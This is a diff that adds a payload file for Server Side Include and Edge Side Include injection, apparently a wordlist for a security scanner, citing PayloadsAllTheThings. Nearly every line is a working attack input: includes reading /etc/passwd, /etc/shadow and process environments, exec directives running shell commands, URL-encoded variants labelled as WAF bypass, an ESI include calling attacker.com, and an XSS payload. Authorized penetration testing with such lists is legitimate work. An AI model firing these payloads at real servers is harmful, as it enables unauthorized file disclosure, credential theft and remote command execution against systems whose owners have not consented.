@@ -1,0 +1,73 @@
+# SSI Injection Payloads
+# Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection
+
+# Basic SSI directives
+<!--#printenv -->
+<!--#echo var="DATE_LOCAL" -->
+<!--#echo var="DOCUMENT_ROOT" -->
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="DOCUMENT_URI" -->
+<!--#echo var="LAST_MODIFIED" -->
+<!--#echo var="SERVER_SOFTWARE" -->
+<!--#echo var="SERVER_NAME" -->
+
+# Config directives
+<!--#config timefmt="%Y-%m-%d %H:%M:%S" -->
+<!--#config errmsg="SSI Error" -->
+<!--#config sizefmt="bytes" -->
+
+# Include directives (LFI)
+<!--#include virtual="/etc/passwd" -->
+<!--#include file="/etc/passwd" -->
+<!--#include virtual="/etc/shadow" -->
+<!--#include virtual="/etc/hosts" -->
+<!--#include virtual="../../../etc/passwd" -->
+<!--#include virtual="....//....//....//etc/passwd" -->
+<!--#include file="C:\Windows\System32\drivers\etc\hosts" -->
+<!--#include virtual="/proc/self/environ" -->
+<!--#include virtual="/var/log/apache2/access.log" -->
+
+# Command execution (RCE)
+<!--#exec cmd="id" -->
+<!--#exec cmd="whoami" -->
+<!--#exec cmd="uname -a" -->
+<!--#exec cmd="cat /etc/passwd" -->
+<!--#exec cmd="ls -la" -->
+<!--#exec cmd="pwd" -->
+<!--#exec cmd="env" -->
+<!--#exec cgi="/cgi-bin/printenv.pl" -->
+
+# Windows command execution
+<!--#exec cmd="dir" -->
+<!--#exec cmd="type C:\Windows\System32\drivers\etc\hosts" -->
+<!--#exec cmd="whoami /all" -->
+
+# Encoded payloads (WAF bypass)
+<!--%23exec%20cmd="id"%20-->
+<!--%23include%20virtual="/etc/passwd"%20-->
+%3C!--%23exec%20cmd%3D%22id%22%20--%3E
+
+# Edge Side Includes (ESI)
+<esi:include src="http://attacker.com/capture" />
+<esi:include src="/etc/passwd" />
+<!--esi <esi:include src="http://localhost/" /> -->
+<esi:inline name="/test" fetchable="yes">malicious content</esi:inline>
+
+# XSS via SSI
+<!--#set var="x" value="<script>alert(1)</script>" --><!--#echo var="x" -->
+<!--#echo var="QUERY_STRING" -->
+
+# Conditional SSI
+<!--#if expr="${QUERY_STRING} = 'test'" -->Vulnerable<!--#endif -->
+
+# Set variable
+<!--#set var="name" value="test" -->
+<!--#echo var="name" -->
+
+# Flastmod (file modification time)
+<!--#flastmod file="index.html" -->
+<!--#flastmod virtual="/etc/passwd" -->
+
+# Fsize (file size)
+<!--#fsize file="index.html" -->
+<!--#fsize virtual="/etc/passwd" -->
